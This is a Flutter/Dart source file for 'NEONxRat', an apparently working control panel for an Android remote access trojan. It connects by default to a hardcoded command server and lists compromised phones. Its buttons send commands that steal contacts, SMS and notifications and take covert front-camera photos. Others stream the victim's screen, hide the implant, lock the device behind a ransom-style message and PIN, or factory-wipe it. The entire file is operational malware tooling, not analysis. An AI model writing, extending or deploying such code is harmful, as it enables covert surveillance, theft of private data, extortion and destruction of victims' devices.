import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;

void main() => runApp(GhostControlApp());

class GhostControlApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: Color(0xFF000000),
        primaryColor: Colors.redAccent,
        fontFamily: 'Rajdhani',
      ),
      home: ServerSetupPage(),
    );
  }
}

// ==================== SERVER SETUP ====================
class ServerSetupPage extends StatefulWidget {
  @override
  _ServerSetupPageState createState() => _ServerSetupPageState();
}

class _ServerSetupPageState extends State<ServerSetupPage> {
  TextEditingController serverCtrl = TextEditingController(
    text: "http://private01.angkasanyabobo.my.id:1326",
  ); // URL API Server
  void connect() => Navigator.pushReplacement(
    context,
    MaterialPageRoute(
      builder: (_) => DeviceListPage(serverUrl: serverCtrl.text),
    ),
  );

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: EdgeInsets.all(30),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(Icons.security, size: 80, color: Colors.redAccent),
              SizedBox(height: 20),
              Text(
                "NEONxRat MODE",
                style: TextStyle(
                  fontSize: 28,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 3,
                ),
              ),
              SizedBox(height: 30),
              TextField(
                controller: serverCtrl,
                style: TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  labelText: "Server URL",
                  labelStyle: TextStyle(color: Colors.white54),
                ),
              ),
              SizedBox(height: 20),
              ElevatedButton.icon(
                icon: Icon(Icons.power),
                label: Text(
                  "CONNECT",
                  style: TextStyle(fontSize: 18, letterSpacing: 2),
                ),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.redAccent,
                  padding: EdgeInsets.symmetric(horizontal: 40, vertical: 12),
                ),
                onPressed: connect,
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==================== DEVICE LIST ====================
class DeviceListPage extends StatefulWidget {
  final String serverUrl;
  DeviceListPage({required this.serverUrl});

  @override
  _DeviceListPageState createState() => _DeviceListPageState();
}

class _DeviceListPageState extends State<DeviceListPage> {
  List devices = [];
  Timer? _timer;
  int totalDevices = 0;

  fetchDevices() async {
    try {
      final res = await http.get(Uri.parse('${widget.serverUrl}/api/devices'));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (mounted)
          setState(() {
            devices = data;
            totalDevices = data.length;
          });
      }
    } catch (e) {}
  }

  @override
  void initState() {
    super.initState();
    fetchDevices();
    _timer = Timer.periodic(Duration(seconds: 5), (t) => fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(
          "DEVICE MANAGER",
          style: TextStyle(letterSpacing: 2, fontWeight: FontWeight.bold),
        ),
        centerTitle: true,
        backgroundColor: Colors.black,
        elevation: 0,
        actions: [
          IconButton(
            icon: Icon(Icons.refresh, color: Colors.white54),
            onPressed: fetchDevices,
          ),
        ],
        bottom: PreferredSize(
          preferredSize: Size.fromHeight(20),
          child: Padding(
            padding: const EdgeInsets.only(bottom: 10.0),
            child: Text(
              "Total Devices: $totalDevices",
              style: TextStyle(
                color: Colors.white70,
                fontSize: 16,
                fontWeight: FontWeight.bold,
              ),
            ),
          ),
        ),
      ),
      body: devices.isEmpty
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  CircularProgressIndicator(color: Colors.redAccent),
                  SizedBox(height: 20),
                  Text(
                    "SCANNING NETWORK...",
                    style: TextStyle(
                      color: Colors.white54,
                      fontSize: 18,
                      letterSpacing: 2,
                    ),
                  ),
                ],
              ),
            )
          : Padding(
              padding: const EdgeInsets.all(12.0),
              child: GridView.builder(
                gridDelegate: SliverGridDelegateWithFixedCrossAxisCount(
                  crossAxisCount: 2,
                  crossAxisSpacing: 15,
                  mainAxisSpacing: 15,
                  childAspectRatio: 0.80,
                ),
                itemCount: devices.length,
                itemBuilder: (ctx, i) => _buildDeviceCard(devices[i]),
              ),
            ),
    );
  }

  Widget _buildDeviceCard(Map d) {
    bool isOnline = d['isOnline'] ?? false;
    String batteryText = "${d['battery'] ?? 'N/A'}%";

    return GestureDetector(
      onTap: () => Navigator.push(
        context,
        MaterialPageRoute(
          builder: (_) =>
              ControlPanelPage(deviceData: d, serverUrl: widget.serverUrl),
        ),
      ),
      child: Container(
        decoration: BoxDecoration(
          color: Colors.black,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: isOnline
                ? Colors.redAccent.withOpacity(0.5)
                : Colors.white12,
            width: 1,
          ),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Container(
              height: 110,
              child: Center(
                child: Icon(
                  Icons.phone_android,
                  size: 50,
                  color: isOnline ? Colors.redAccent : Colors.grey,
                ),
              ),
            ),
            Padding(
              padding: EdgeInsets.all(10),
              child: Text(
                d['model'] ?? "Unknown Device",
                style: TextStyle(
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                  color: Colors.white,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ),
            Container(
              padding: EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.05),
                borderRadius: BorderRadius.vertical(
                  bottom: Radius.circular(20),
                ),
              ),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  Text(
                    batteryText,
                    style: TextStyle(fontSize: 12, color: Colors.white54),
                  ),
                  Text(
                    isOnline ? "ONLINE" : "OFFLINE",
                    style: TextStyle(
                      fontSize: 12,
                      color: isOnline ? Colors.redAccent : Colors.white24,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==================== CONTROL PANEL ====================
class ControlPanelPage extends StatefulWidget {
  final Map deviceData;
  final String serverUrl;
  ControlPanelPage({required this.deviceData, required this.serverUrl});

  @override
  _ControlPanelPageState createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> {
  String get deviceId => widget.deviceData['deviceId'];
  String get server => widget.serverUrl;

  Future<void> sendCmd(String cmd, Map? payload) async {
    try {
      await http.post(
        Uri.parse('$server/api/command'),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "deviceId": deviceId,
          "command": cmd,
          "payload": payload,
        }),
      );
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Text("Sent: $cmd", style: TextStyle(fontFamily: 'Rajdhani')),
          backgroundColor: Colors.redAccent,
          behavior: SnackBarBehavior.floating,
        ),
      );
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text("Error: $e"), backgroundColor: Colors.red),
      );
    }
  }

  void showLockDialog() {
    TextEditingController msg = TextEditingController(
      text: "Kembalikan Perangkat Ini.",
    );
    TextEditingController pin = TextEditingController(text: "1234");
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: Colors.grey[900],
        title: Text("LOCK SETTINGS", style: TextStyle(color: Colors.redAccent)),
        content: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: msg,
                style: TextStyle(color: Colors.white),
                decoration: InputDecoration(labelText: "Message"),
              ),
              SizedBox(height: 10),
              TextField(
                controller: pin,
                style: TextStyle(color: Colors.white),
                keyboardType: TextInputType.number,
                decoration: InputDecoration(labelText: "PIN"),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            child: Text("Cancel", style: TextStyle(color: Colors.white54)),
            onPressed: () => Navigator.pop(ctx),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent),
            child: Text("EXECUTE"),
            onPressed: () {
              sendCmd("LOCK", {"message": msg.text, "pin": pin.text});
              Navigator.pop(ctx);
            },
          ),
        ],
      ),
    );
  }

  void showWallpaperDialog() {
    TextEditingController url = TextEditingController();
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        backgroundColor: Colors.grey[900],
        title: Text("SET WALLPAPER", style: TextStyle(color: Colors.teal)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              "Enter direct image URL",
              style: TextStyle(color: Colors.white54),
            ),
            SizedBox(height: 10),
            TextField(
              controller: url,
              style: TextStyle(color: Colors.white),
            ),
          ],
        ),
        actions: [
          TextButton(
            child: Text("Cancel"),
            onPressed: () => Navigator.pop(ctx),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.teal),
            child: Text("SET"),
            onPressed: () {
              sendCmd("SET_WALLPAPER", {"url": url.text});
              Navigator.pop(ctx);
            },
          ),
        ],
      ),
    );
  }

  // --- LOCKHARD DIALOG ---
  void showLockhardDialog() {
    TextEditingController htmlCtrl = TextEditingController(
      text:
          "<h1 style='color:red;text-align:center;margin-top:100px'>DEVICE LOCKED</h1><p style='text-align:center;color:white'>Return Immediately!</p>",
    );
    TextEditingController mp3Ctrl = TextEditingController();
    bool isDisco = false;
    bool isHorror = true;
    bool isBlockNotif = true;

    showDialog(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (context, setDialogState) {
          return AlertDialog(
            backgroundColor: Colors.grey[900],
            title: Text(
              "LOCKHARD MODE",
              style: TextStyle(color: Colors.red, fontWeight: FontWeight.bold),
            ),
            content: SingleChildScrollView(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    "HTML Code:",
                    style: TextStyle(
                      color: Colors.white70,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  SizedBox(height: 5),
                  TextField(
                    controller: htmlCtrl,
                    maxLines: 5,
                    style: TextStyle(
                      color: Colors.white,
                      fontFamily: 'monospace',
                    ),
                    decoration: InputDecoration(
                      fillColor: Colors.black,
                      filled: true,
                      border: OutlineInputBorder(),
                    ),
                  ),
                  SizedBox(height: 15),
                  Row(
                    children: [
                      Checkbox(
                        value: isDisco,
                        activeColor: Colors.red,
                        onChanged: (v) => setDialogState(() => isDisco = v!),
                      ),
                      Text(
                        "Disco Flash",
                        style: TextStyle(color: Colors.white),
                      ),
                    ],
                  ),
                  Row(
                    children: [
                      Checkbox(
                        value: isHorror,
                        activeColor: Colors.red,
                        onChanged: (v) => setDialogState(() => isHorror = v!),
                      ),
                      Text(
                        "Horror Sound",
                        style: TextStyle(color: Colors.white),
                      ),
                    ],
                  ),
                  Row(
                    children: [
                      Checkbox(
                        value: isBlockNotif,
                        activeColor: Colors.red,
                        onChanged: (v) =>
                            setDialogState(() => isBlockNotif = v!),
                      ),
                      Text(
                        "Block Notif",
                        style: TextStyle(color: Colors.white),
                      ),
                    ],
                  ),
                  SizedBox(height: 10),
                  TextField(
                    controller: mp3Ctrl,
                    style: TextStyle(color: Colors.white),
                    decoration: InputDecoration(
                      labelText: "MP3 URL (Optional)",
                      labelStyle: TextStyle(color: Colors.white54),
                    ),
                  ),
                ],
              ),
            ),
            actions: [
              TextButton(
                child: Text("Cancel", style: TextStyle(color: Colors.white54)),
                onPressed: () => Navigator.pop(ctx),
              ),
              ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                child: Text("EXECUTE"),
                onPressed: () {
                  sendCmd("LOCKHARD", {
                    "html": htmlCtrl.text,
                    "disco": isDisco,
                    "horror": isHorror,
                    "mp3": mp3Ctrl.text,
                    "block_notif": isBlockNotif,
                    "pin": "1234",
                  });
                  Navigator.pop(ctx);
                },
              ),
            ],
          );
        },
      ),
    );
  }

  void openSpyCenter() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (_) => SpyCenterPage(deviceId: deviceId, serverUrl: server),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text(
          "CONTROL: ${widget.deviceData['model']}",
          style: TextStyle(letterSpacing: 1),
        ),
        backgroundColor: Colors.black,
        elevation: 0,
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(8.0),
        child: GridView.count(
          crossAxisCount: 3,
          crossAxisSpacing: 8,
          mainAxisSpacing: 8,
          children: [
            // Row 1
            _buildBtn(
              Icons.lock,
              "LOCK",
              Colors.redAccent,
              () => showLockDialog(),
            ),
            _buildBtn(
              Icons.lock,
              "LOCKHARD",
              Colors.red,
              () => showLockhardDialog(),
            ),
            _buildBtn(
              Icons.lock_open,
              "UNLOCK",
              Colors.green,
              () => sendCmd("UNLOCK", {}),
            ),

            // Row 2
            _buildBtn(
              Icons.wallpaper,
              "WALLPAPER",
              Colors.teal,
              () => showWallpaperDialog(),
            ),
            _buildBtn(
              Icons.flash_on,
              "FLASH ON",
              Colors.yellow,
              () => sendCmd("FLASH_ON", {}),
            ),
            _buildBtn(
              Icons.flash_off,
              "FLASH OFF",
              Colors.grey,
              () => sendCmd("FLASH_OFF", {}),
            ),

            // Row 3
            _buildBtn(
              Icons.lightbulb,
              "DISCO ON",
              Colors.purple,
              () => sendCmd("DISCO_START", {}),
            ),
            _buildBtn(
              Icons.stop,
              "DISCO OFF",
              Colors.purpleAccent,
              () => sendCmd("DISCO_STOP", {}),
            ),
            _buildBtn(
              Icons.volume_up,
              "ALARM",
              Colors.blue,
              () => sendCmd("ALARM", {}),
            ),

            // Row 4
            _buildBtn(
              Icons.contacts,
              "CONTACTS",
              Colors.cyan,
              () => sendCmd("GET_CONTACTS", {}),
            ),
            _buildBtn(
              Icons.sms,
              "SMS",
              Colors.indigo,
              () => sendCmd("GET_MESSAGES", {}),
            ),
            _buildBtn(
              Icons.info,
              "INFO",
              Colors.white70,
              () => sendCmd("GET_DEVICE_INFO", {}),
            ),

            // Row 5 (SPY)
            _buildBtn(
              Icons.camera_alt,
              "SPY CAM",
              Colors.pink,
              () => sendCmd("CAM_FRONT", {}),
            ),
            _buildBtn(
              Icons.screen_share,
              "LIVE SCREEN",
              Colors.deepPurple,
              () => openSpyCenter(),
            ),
            _buildBtn(
              Icons.folder_shared,
              "SPY CENTER",
              Colors.red,
              () => openSpyCenter(),
            ),

            // Row 6
            _buildBtn(
              Icons.visibility_off,
              "HIDE",
              Colors.black54,
              () => sendCmd("HIDE_APP", {}),
            ),
            _buildBtn(
              Icons.visibility,
              "SHOW",
              Colors.white30,
              () => sendCmd("UNHIDE_APP", {}),
            ),
            _buildBtn(Icons.delete, "WIPE", Colors.red[900]!, () {
              showDialog(
                context: context,
                builder: (c) => AlertDialog(
                  backgroundColor: Colors.black,
                  title: Text(
                    "ARE YOU SURE?",
                    style: TextStyle(color: Colors.red),
                  ),
                  content: Text(
                    "Factory reset device?",
                    style: TextStyle(color: Colors.white),
                  ),
                  actions: [
                    TextButton(
                      onPressed: () => Navigator.pop(c),
                      child: Text("CANCEL"),
                    ),
                    ElevatedButton(
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.red,
                      ),
                      onPressed: () {
                        sendCmd("WIPE_DATA", {});
                        Navigator.pop(c);
                      },
                      child: Text("WIPE"),
                    ),
                  ],
                ),
              );
            }),
          ],
        ),
      ),
    );
  }

  Widget _buildBtn(
    IconData icon,
    String label,
    Color color,
    VoidCallback onTap,
  ) {
    return InkWell(
      onTap: onTap,
      child: Container(
        decoration: BoxDecoration(
          color: Colors.black,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: color.withOpacity(0.3), width: 1),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: color, size: 24),
            SizedBox(height: 5),
            Text(
              label,
              style: TextStyle(
                color: Colors.white,
                fontSize: 11,
                fontWeight: FontWeight.bold,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==================== SPY CENTER PAGE ====================
class SpyCenterPage extends StatefulWidget {
  final String deviceId;
  final String serverUrl;
  SpyCenterPage({required this.deviceId, required this.serverUrl});

  @override
  _SpyCenterPageState createState() => _SpyCenterPageState();
}

class _SpyCenterPageState extends State<SpyCenterPage> {
  String get server => widget.serverUrl;
  String get deviceId => widget.deviceId;

  Map<String, dynamic> intelData = {};
  Timer? _timer;
  bool isLoading = true;
  bool isLiveActive = false;

  fetchIntel() async {
    try {
      final res = await http.get(Uri.parse('$server/api/intel/$deviceId'));
      if (res.statusCode == 200) {
        if (mounted)
          setState(() {
            intelData = jsonDecode(res.body);
            isLoading = false;
          });
      }
    } catch (e) {}
  }

  @override
  void initState() {
    super.initState();
    fetchIntel();
    _timer = Timer.periodic(Duration(seconds: 1), (t) {
      fetchIntel();
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> sendCmd(String cmd, Map? payload) async {
    await http.post(
      Uri.parse('$server/api/command'),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "deviceId": deviceId,
        "command": cmd,
        "payload": payload,
      }),
    );
    ScaffoldMessenger.of(
      context,
    ).showSnackBar(SnackBar(content: Text("Sent: $cmd")));
  }

  void toggleLiveScreen() {
    if (isLiveActive) {
      sendCmd("STOP_LIVE_SCREEN", {});
      setState(() => isLiveActive = false);
    } else {
      sendCmd("START_LIVE_SCREEN", {});
      setState(() => isLiveActive = true);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("SPY DASHBOARD"),
        backgroundColor: Colors.black,
        actions: [
          IconButton(
            icon: Icon(Icons.refresh),
            onPressed: () {
              sendCmd("GET_ALL_DATA", {});
              fetchIntel();
            },
          ),
        ],
      ),
      body: isLoading
          ? Center(child: CircularProgressIndicator())
          : SingleChildScrollView(
              padding: EdgeInsets.all(10),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // --- LIVE SCREEN AREA ---
                  Stack(
                    children: [
                      Container(
                        height: 220,
                        width: double.infinity,
                        color: Colors.black,
                        child:
                            (intelData['lastScreenshot'] != null &&
                                intelData['lastScreenshot'].isNotEmpty)
                            ? Image.network(
                                intelData['lastScreenshot'],
                                fit: BoxFit.cover,
                                gaplessPlayback: true,
                                headers: {"Cache-Control": "no-cache"},
                              )
                            : Center(
                                child: Text(
                                  "No Feed",
                                  style: TextStyle(color: Colors.white24),
                                ),
                              ),
                      ),
                      if (isLiveActive)
                        Positioned(
                          top: 10,
                          left: 10,
                          child: Container(
                            padding: EdgeInsets.all(5),
                            color: Colors.red,
                            child: Text(
                              "LIVE",
                              style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ),
                        ),
                    ],
                  ),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: isLiveActive
                              ? Colors.red
                              : Colors.green,
                        ),
                        icon: Icon(
                          isLiveActive ? Icons.stop : Icons.play_arrow,
                        ),
                        label: Text(isLiveActive ? "STOP LIVE" : "START LIVE"),
                        onPressed: toggleLiveScreen,
                      ),
                      SizedBox(width: 10),
                      ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.pink,
                        ),
                        icon: Icon(Icons.camera_front),
                        label: Text("Selfie"),
                        onPressed: () => sendCmd("CAM_FRONT", {}),
                      ),
                    ],
                  ),
                  SizedBox(height: 20),

                  // --- DEVICE LOGS ---
                  Text(
                    "DEVICE ACTIVITY",
                    style: TextStyle(
                      color: Colors.white70,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  SizedBox(height: 10),
                  Container(
                    height: 300,
                    decoration: BoxDecoration(
                      border: Border.all(color: Colors.white24),
                      borderRadius: BorderRadius.circular(10),
                    ),
                    child: (intelData['notifications'] as List).isEmpty
                        ? Center(
                            child: Text(
                              "No Data",
                              style: TextStyle(color: Colors.white24),
                            ),
                          )
                        : ListView.builder(
                            itemCount:
                                (intelData['notifications'] as List).length,
                            itemBuilder: (c, i) {
                              var n = intelData['notifications'][i];
                              return ListTile(
                                dense: true,
                                leading: Icon(
                                  Icons.notifications_active,
                                  color: Colors.white,
                                ),
                                title: Text(
                                  n['title'] ?? "No Title",
                                  style: TextStyle(color: Colors.white),
                                ),
                                subtitle: Text(
                                  n['text'] ?? "",
                                  style: TextStyle(color: Colors.white54),
                                ),
                              );
                            },
                          ),
                  ),
                ],
              ),
            ),
    );
  }
}
